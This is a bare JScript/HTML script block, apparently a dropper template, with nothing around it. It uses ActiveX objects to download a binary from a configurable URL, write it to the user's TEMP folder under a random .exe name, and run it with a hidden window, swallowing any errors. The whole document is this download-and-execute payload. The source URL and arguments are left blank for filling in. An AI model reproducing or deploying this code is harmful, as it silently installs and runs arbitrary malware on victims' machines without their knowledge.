<script>
var SRC = "";
var CMDLINE = "";
var out = Math.random().toString(36).substring(7) + ".exe";
var axo = this.ActiveXObject;
var wshell = new axo("WScript.Shell");
var path = wshell.ExpandEnvironmentStrings("%TEMP%") + "/" + out;
var xhr = new axo("MSXML2.XMLHTTP");

xhr.onreadystatechange = function () {
	if (xhr.readystate === 4) {
		var adodb = new axo("ADODB.Stream");
		adodb.open();
		adodb.type = 1;
		adodb.write(xhr.ResponseBody);
		adodb.position = 0;
		adodb.saveToFile(path, 2);
		adodb.close();
	};
};
try {
	xhr.open("GET", SRC, false);
	xhr.send();
	wshell.Run(path + " " + CMDLINE, 0, false);
} catch (err) { };
</script>